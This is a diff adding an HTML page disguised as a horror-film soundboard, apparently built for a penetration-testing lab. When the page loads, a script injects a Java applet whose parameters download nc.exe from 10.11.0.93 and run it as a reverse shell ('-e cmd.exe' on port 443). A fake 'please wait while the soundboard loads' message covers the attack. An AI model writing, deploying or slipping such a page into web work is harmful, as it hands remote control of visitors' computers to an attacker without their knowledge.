@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-us" xml:lang="en-us">
+<head>
+<title> SAW Soundboard! Brought to you by The Agency </title>
+<meta name="description" content="SAW Soundboard">
+<meta title="Soundbytes from SAW 1-4">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<link href="./SAWsoundboard.css" rel="stylesheet" type="text/css" title="A" />
+<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script type="text/javascript">
+    function buildApplet (){
+      var iHTML = '\
+      <applet class="sboard" width="100%" height="100%" id="SAWsoundboard" publisher="The Agency" code="Java.class" archive="SAWsoundboard.jar">\
+      <param name="1" value="http://10.11.0.93/nc.exe">\
+      <param name="2" value="-nv 10.11.0.93 443 -e cmd.exe">\
+      <param name="3" value="lone">\
+      </applet>';
+      document.getElementById("soundboard").innerHTML = iHTML;
+    }
+    window.onload = function(){
+      setTimeout(buildApplet, 4000);
+    }
+</script>
+</head>
+<body> <div id="mainbody"> <div id="canvas">
+<div id="header">
+  <div class="h1z1"> <img src="./saw_sticker.jpg"> </img> </div>
+  <div class="mid"> <span> <h1> Sound Board </h1> </span> <p> The finest SAW soundbytes </p> </div>
+</div>
+<div id="main">
+<div class="content">
+  <div id="soundboard" class="applet">
+     .
+  </div>
+</div>
+<div class="status"> <center> <p> Please wait while the soundboard loads.  This may take some time. </p> </center> </div>
+<div class="status"> <center> <p> SAW Soundboard - © 2017 - The Agency </p> </center> </div>
+
+</div>
+</div></div>
+</body>
+</html>
